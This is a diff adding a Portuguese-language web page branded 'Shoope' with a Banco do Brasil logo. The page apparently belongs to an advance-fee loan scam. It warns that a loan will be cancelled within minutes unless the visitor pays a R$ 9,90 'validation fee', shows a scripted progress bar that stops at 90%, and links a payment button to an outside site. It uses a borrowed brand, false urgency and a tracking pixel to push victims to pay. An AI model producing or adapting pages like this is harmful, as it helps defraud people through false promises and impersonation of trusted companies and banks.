@@ -1,0 +1,163 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Shoope</title>
+  <link rel="preload" href="css/style.css" as="style">
+  <link rel="preload" href="css/slider.css" as="style">
+  <link rel="preload" href="css/animated.css" as="style">
+  <link rel="preload" href="css/notiflix-3.2.5.min.css" as="style">
+  <link rel="stylesheet" href="css/style.css">
+  <link rel="stylesheet" href="css/slider.css">
+  <link rel="stylesheet" href="css/animated.css">
+  <link rel="stylesheet" href="css/notiflix-3.2.5.min.css">
+  <link rel="shortcut icon" href="images/faveicon.png">
+  <script>
+    window.pixelId = "68478c2e2058440e4c5174d0";
+    var a = document.createElement("script");
+    a.setAttribute("async", "");
+    a.setAttribute("defer", "");
+    a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+    document.head.appendChild(a);
+  </script>
+  
+      <script src="js/br.js" defer=""></script>
+
+
+
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f9f9f9;
+      margin: 0;
+      padding: 0;
+      visibility: hidden;
+    }
+    .container {
+      max-width: 500px;
+      margin: 20px auto;
+      background-color: #fff;
+      padding: 20px;
+      border-radius: 15px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      text-align: center;
+    }
+    .alert {
+      font-size: 13px;
+      color: #842029;
+      border: 1px solid #f5c2c7;
+      padding: 10px;
+      background-color: #f8d7da;
+      border-radius: 10px;
+      margin-top: 15px;
+    }
+    .progress-container {
+      width: 100%;
+      background-color: #e0e0e0;
+      border-radius: 5px;
+      overflow: hidden;
+      margin: 20px 0;
+      height: 30px;
+    }
+    .progress-bar {
+      width: 0%;
+      height: 100%;
+      background-color: #fe6233;
+      color: #fff;
+      text-align: center;
+      line-height: 30px;
+      transition: width 0.4s ease;
+      font-weight: bold;
+    }
+    .btn {
+      display: block;
+      background-color: #fe6233;
+      color: white;
+      padding: 15px;
+      border: none;
+      border-radius: 10px;
+      width: 100%;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+      margin-top: 20px;
+    }
+    .footer-logo {
+      margin-top: 30px;
+    }
+    #preloader {
+      background: #ffffff;
+      position: fixed;
+      z-index: 9999;
+      width: 100%;
+      height: 100%;
+      top: 0;
+      left: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    .tarifa-valor {
+      font-size: 16px;
+      font-weight: bold;
+      color: #fe6233;
+      margin-top: 20px;
+    }
+  </style>
+<script src="js/br.js" defer=""></script></head>
+<body>
+  <div id="preloader">
+    <img src="images/unnamed.png" alt="Carregando..." style="width: 50px;">
+  </div>
+
+  <div class="container">
+    <div class="alert">
+      <strong>ATENÇÃO:</strong><br>
+      Caso o pagamento da tarifa não seja realizado nos próximos minutos, o empréstimo será automaticamente cancelado pelo sistema.
+    </div>
+    <div class="progress-container">
+      <div id="myProgressBar" class="progress-bar">0%</div>
+    </div>
+    <img src="images/C-pia-de-Inserir-um-t-tulo-1.png" alt="Saque" style="width: 80%; max-width: 400px; margin: 20px auto;">
+    <p style="font-size: 14px;">
+      Para liberação, é necessário realizar o pagamento da tarifa de validação. Após o pagamento, o valor será transferido imediatamente para sua chave PIX.<br><br>
+      <strong>Evite o cancelamento automático e confirme agora.</strong>
+    </p>
+
+    <p class="tarifa-valor">Valor da tarifa: <strong>R$ 9,90</strong></p>
+
+    <a style="max-width:95%;text-decoration: none;" href="https://www.seguropagamentos.com.br/shoopeup8" class="btn pagamentoBanco do Brasil" id="paymentButton">PAGAR TARIFA E RECEBER</a>
+
+    <div class="footer-logo">
+      <img src="images/channels4_profile.jpg" alt="Banco do Brasil" style="width: 35px;">
+    </div>
+    <p style="font-size: 12px; color: gray; margin-top: 10px;">Shoope, 2025. Todos os direitos reservados.</p>
+  </div>
+
+  <script src="js/notiflix-3.2.5.min.js"></script>
+  <script>
+    function updateProgressBar() {
+      const progressBar = document.getElementById('myProgressBar');
+      let width = 0;
+      const interval = setInterval(() => {
+        if (width >= 90) {
+          clearInterval(interval);
+        } else {
+          width++;
+          progressBar.style.width = width + '%';
+          progressBar.textContent = width + '%';
+        }
+      }, 20);
+    }
+
+    window.onload = function () {
+      document.getElementById('preloader').style.display = 'none';
+      document.body.style.visibility = 'visible';
+      updateProgressBar();
+    };
+
+  
+  </script>
+
+
+</body></html>
